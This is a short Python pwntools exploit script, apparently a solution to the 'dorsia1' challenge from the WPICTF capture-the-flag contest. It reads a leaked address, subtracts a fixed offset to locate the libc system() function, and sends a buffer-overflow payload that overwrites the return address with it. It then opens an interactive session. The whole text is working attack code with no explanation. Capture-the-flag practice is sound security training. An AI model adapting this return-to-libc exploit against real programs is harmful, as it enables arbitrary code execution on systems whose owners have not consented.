from pwn import *

# p = remote('dorsia1.wpictf.xyz' ,31337)
p = process('./run')
input("attach")
add = p.recv()

print(add)

system = int(add[2:-1], 16) - 765772

print(hex(system))

payload = b'A'*69 + b'BBBBCCCCDDDDEEEEFFFFGGGGHHHH'
# payload += p64(0x00)
payload += p64(system)

p.sendline(payload)

p.interactive()